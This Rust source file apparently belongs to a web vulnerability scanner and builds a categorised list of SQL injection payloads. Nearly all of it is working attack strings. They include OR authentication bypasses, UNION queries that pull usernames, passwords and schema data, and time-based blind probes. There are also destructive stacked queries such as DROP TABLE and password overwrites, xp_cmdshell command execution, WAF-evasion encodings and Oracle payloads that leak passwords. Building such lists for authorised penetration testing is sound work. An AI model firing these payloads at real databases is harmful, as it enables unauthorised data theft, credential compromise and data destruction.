use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    let basic_sqli = vec![
        ("'", "Single quote injection", Severity::High),
        ("\"", "Double quote injection", Severity::High),
        ("'", "Backtick injection", Severity::High),
        ("\\'", "Escaped single quote", Severity::Medium),
        ("\\\"", "Escaped double quote", Severity::Medium),
    ];

    let error_based = vec![
        ("' OR '1'='1", "Classic OR bypass", Severity::Critical),
        (
            "\" OR \"1\"=\"1",
            "Double quote OR bypass",
            Severity::Critical,
        ),
        (
            "' OR '1'='1'--",
            "OR bypass with comment",
            Severity::Critical,
        ),
        (
            "' OR '1'='1'/*",
            "OR bypass with block comment",
            Severity::Critical,
        ),
        ("1' OR '1' = '1", "Numeric context OR", Severity::Critical),
        ("1 OR 1=1", "Numeric OR no quotes", Severity::Critical),
        ("' OR ''='", "Empty string comparison", Severity::High),
        ("' OR 1=1--", "Simple OR with comment", Severity::Critical),
        (") OR ('1'='1", "Parenthesis OR", Severity::High),
        ("')) OR 1=1--", "Double parenthesis OR", Severity::High),
    ];

    let union_based = vec![
        (
            "' UNION SELECT NULL--",
            "UNION NULL test",
            Severity::Critical,
        ),
        (
            "' UNION SELECT NULL,NULL--",
            "UNION 2 columns",
            Severity::Critical,
        ),
        (
            "' UNION SELECT NULL,NULL,NULL--",
            "UNION 3 columns",
            Severity::Critical,
        ),
        (
            "' UNION SELECT 1,2,3--",
            "UNION numeric columns",
            Severity::Critical,
        ),
        (
            "' UNION SELECT username,password FROM users--",
            "UNION credential extraction",
            Severity::Critical,
        ),
        (
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "UNION schema enumeration",
            Severity::Critical,
        ),
        (
            "' UNION SELECT column_name,NULL FROM information_schema.columns--",
            "UNION column enumeration",
            Severity::Critical,
        ),
        (
            "' UNION ALL SELECT NULL--",
            "UNION ALL variant",
            Severity::Critical,
        ),
        (
            "1 UNION SELECT * FROM users",
            "UNION without quote",
            Severity::Critical,
        ),
    ];

    let time_based = vec![
        (
            "' AND SLEEP(5)--",
            "MySQL SLEEP injection",
            Severity::Critical,
        ),
        (
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "MySQL BENCHMARK",
            Severity::Critical,
        ),
        (
            "'; WAITFOR DELAY '0:0:5'--",
            "SQL Server WAITFOR",
            Severity::Critical,
        ),
        (
            "' AND pg_sleep(5)--",
            "PostgreSQL pg_sleep",
            Severity::Critical,
        ),
        (
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "MySQL nested SLEEP",
            Severity::Critical,
        ),
        (
            "1; WAITFOR DELAY '0:0:5'--",
            "SQL Server stacked WAITFOR",
            Severity::Critical,
        ),
        (
            "'||pg_sleep(5)||'",
            "PostgreSQL concatenation sleep",
            Severity::Critical,
        ),
    ];

    let stacked_queries = vec![
        (
            "'; DROP TABLE users--",
            "DROP TABLE injection",
            Severity::Critical,
        ),
        (
            "'; DELETE FROM users--",
            "DELETE injection",
            Severity::Critical,
        ),
        (
            "'; INSERT INTO users VALUES(1,'hacker','pwned')--",
            "INSERT injection",
            Severity::Critical,
        ),
        (
            "'; UPDATE users SET password='hacked'--",
            "UPDATE injection",
            Severity::Critical,
        ),
        (
            "'; EXEC xp_cmdshell('dir')--",
            "SQL Server command exec",
            Severity::Critical,
        ),
        (
            "'; CREATE TABLE hacked(id INT)--",
            "CREATE TABLE injection",
            Severity::Critical,
        ),
    ];

    let waf_bypass = vec![
        ("'/**/OR/**/1=1--", "Comment bypass OR", Severity::Critical),
        (
            "'/*!50000OR*/1=1--",
            "MySQL version comment bypass",
            Severity::Critical,
        ),
        ("' oR '1'='1", "Case variation bypass", Severity::High),
        ("'	O	R	'1'='1", "Tab bypass", Severity::High),
        ("'%0aOR%0a'1'='1", "Newline bypass", Severity::High),
        ("'	oR	'1'='1", "Mixed whitespace bypass", Severity::High),
        (
            "'/**/'OR'/**/'1'='1",
            "Comment separation bypass",
            Severity::High,
        ),
        ("1'oorr'1'='1", "Double keyword bypass", Severity::Medium),
        (
            "' UN%ION SELECT NULL--",
            "URL encoded keyword",
            Severity::High,
        ),
        (
            "' UN//ION SELECT NULL--",
            "Double slash bypass",
            Severity::High,
        ),
        (
            "' UNION/**/SELECT NULL--",
            "Comment in keyword",
            Severity::High,
        ),
        (
            "'uNiOn'sElEcT'null--",
            "Quote separation bypass",
            Severity::Medium,
        ),
        (
            "'-UNION-SELECT-null--",
            "Dash separation bypass",
            Severity::Medium,
        ),
    ];

    let encoded = vec![
        (
            "%27%20OR%201%3D1--",
            "URL encoded OR injection",
            Severity::High,
        ),
        (
            "%27%20UNION%20SELECT%20NULL--",
            "URL encoded UNION",
            Severity::High,
        ),
        ("%2527%20OR%201%3D1--", "Double URL encoded", Severity::High),
        ("%%2727%%2727", "Double encoding bypass", Severity::Medium),
        ("%u0027%u004f%u0052", "Unicode encoding", Severity::Medium),
        ("%EF%BF%BD%27", "Invalid UTF-8 sequence", Severity::Medium),
    ];

    let db_specific = vec![
        ("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "SQL Server CONVERT", Severity::High),
        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "MySQL EXTRACTVALUE", Severity::High),
        ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--", "MySQL UPDATEXML", Severity::High),
        ("' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "MySQL GROUP BY error", Severity::High),
        ("' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)--", "PostgreSQL CASE error", Severity::High),
        ("'||UTL_INADDR.get_host_address((SELECT password FROM users WHERE rownum=1))||'", "Oracle UTL_INADDR", Severity::Critical),
        ("'||ctxsys.drithsx.sn(1,(SELECT password FROM users WHERE rownum=1))||'", "Oracle DRITHSX", Severity::Critical),
    ];

    for (payload, desc, severity) in basic_sqli {
        payloads.push(Payload {
            payload_type: PayloadType::Sqli,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["basic".to_string()],
        });
    }

    for (payload, desc, severity) in error_based {
        payloads.push(Payload {
            payload_type: PayloadType::Sqli,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["error-based".to_string()],
        });
    }

    for (payload, desc, severity) in union_based {
        payloads.push(Payload {
            payload_type: PayloadType::Sqli,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["union-based".to_string()],
        });
    }

    for (payload, desc, severity) in time_based {
        payloads.push(Payload {
            payload_type: PayloadType::Sqli,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["time-based".to_string(), "blind".to_string()],
        });
    }

    for (payload, desc, severity) in stacked_queries {
        payloads.push(Payload {
            payload_type: PayloadType::Sqli,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["stacked-queries".to_string()],
        });
    }

    for (payload, desc, severity) in waf_bypass {
        payloads.push(Payload {
            payload_type: PayloadType::Sqli,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["waf-bypass".to_string()],
        });
    }

    for (payload, desc, severity) in encoded {
        payloads.push(Payload {
            payload_type: PayloadType::Sqli,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["encoded".to_string()],
        });
    }

    for (payload, desc, severity) in db_specific {
        payloads.push(Payload {
            payload_type: PayloadType::Sqli,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["db-specific".to_string()],
        });
    }

    payloads
}
